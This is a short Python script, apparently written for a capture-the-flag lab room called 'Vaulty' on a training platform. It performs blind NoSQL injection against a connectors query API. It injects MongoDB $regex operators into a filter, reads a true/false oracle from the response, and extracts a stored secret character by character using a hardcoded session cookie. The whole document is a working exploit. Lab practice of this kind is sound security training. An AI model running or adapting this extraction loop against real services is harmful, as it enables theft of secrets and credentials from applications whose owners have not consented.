#script by Claudi for Bugforge room Vaulty

import requests, re, string

URL = "https://lab-1788190941597-vf4p2n.labs-app.bugforge.io/api/connectors/directory/query"
BASE = {"type": "connector", "org": "vaultly-hq"}
charset = string.hexdigits.lower() + string.ascii_letters + string.digits + "-_=+/."
# dedupe if you like; start with the charset the secret is most likely in (hex? base64url?)

def true(regex):
    body = {"filter": {**BASE, "secret": {"$regex": regex}}}
    r = requests.post(URL, json=body, headers={"Cookie": "vaultly_session=kGOWB7Wjh_Ogha_wFikqDIsvTGxC0lwJ"})
    return "vaultly-hq" in r.text          # <-- replace with YOUR confirmed oracle

assert true("^")                            # sanity: baseline TRUE
assert not true("^ZZZZZ")                   # sanity: baseline FALSE

found = ""
while True:
    for c in charset:
        cand = "^" + re.escape(found + c)
        if true(cand):
            found += c
            print(repr(found))
            break
    else:
        if true("^" + re.escape(found) + "$"):
            print("DONE:", found); break
        else:
            print("stalled — widen charset"); break
